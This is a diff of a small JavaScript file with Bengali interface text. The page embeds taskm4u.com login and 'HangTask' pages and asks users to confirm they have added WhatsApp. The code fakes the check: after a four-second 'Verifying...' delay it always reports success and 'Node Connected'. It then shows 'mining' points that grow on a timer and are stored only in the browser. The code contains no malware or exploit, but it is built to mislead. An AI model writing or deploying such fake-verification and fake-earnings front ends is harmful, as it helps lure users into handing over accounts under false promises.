@@ -1,42 +1,46 @@
-const links = {
+let pts = parseFloat(localStorage.getItem('pts_save')) || 0;
+const linkMap = {
     login: "https://www.taskm4u.com/#/login",
     hang: "https://www.taskm4u.com/#/HangTask"
 };
 
-let balance = parseFloat(localStorage.getItem('user_points')) || 0;
-
-function copyData(val) {
-    navigator.clipboard.writeText(val).then(() => alert("কপি হয়েছে!"));
+function cpData(t) {
+    navigator.clipboard.writeText(t).then(() => alert("কপি হয়েছে!"));
 }
 
-// পরবর্তী ধাপে (HangTask) যাওয়ার ফাংশন
-function openHang() {
-    document.getElementById('view-login').style.display = 'none';
-    document.getElementById('view-hang').style.display = 'flex';
-    document.getElementById('hangIframe').src = links.hang;
+function changeV(vName) {
+    document.querySelectorAll('.view').forEach(v => v.classList.remove('active-view'));
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    
+    document.getElementById('view-' + vName).classList.add('active-view');
+    document.getElementById('n-' + vName).classList.add('active');
 }
 
-// ফাইনাল ভেরিফাই
-function verifyFinal() {
-    const btn = document.getElementById('verifyBtn');
-    btn.innerText = "Checking Node...";
-    btn.style.background = "#444";
-    btn.disabled = true;
+function processStep() {
+    const btn = document.getElementById('nextBtn');
+    const ifr = document.getElementById('appIframe');
 
-    setTimeout(() => {
-        alert("Verification Success!");
-        document.getElementById('view-hang').style.display = 'none';
-        document.getElementById('view-final').style.display = 'flex';
-        startMining();
-    }, 4000);
+    if (btn.innerText.includes("লগইন")) {
+        ifr.src = linkMap.hang;
+        btn.innerText = "হোয়াটসঅ্যাপ অ্যাড করেছি (Verify)";
+    } else {
+        btn.innerText = "Verifying...";
+        btn.disabled = true;
+        setTimeout(() => {
+            alert("সফলভাবে যুক্ত হয়েছে!");
+            btn.innerText = "Node Connected (Active)";
+            startMining();
+        }, 4000);
+    }
 }
 
 function startMining() {
     setInterval(() => {
-        balance += (30 / 3600);
-        document.getElementById('displayPts').innerText = balance.toFixed(2) + " PT";
-        localStorage.setItem('user_points', balance);
+        pts += (30/3600);
+        document.getElementById('drawPoints').innerText = pts.toFixed(2) + " PT";
+        localStorage.setItem('pts_save', pts);
     }, 1000);
 }
 
-document.getElementById('displayPts').innerText = balance.toFixed(2) + " PT";
+// ইনিশিয়াল পয়েন্ট আপডেট
+document.getElementById('drawPoints').innerText = pts.toFixed(2) + " PT";
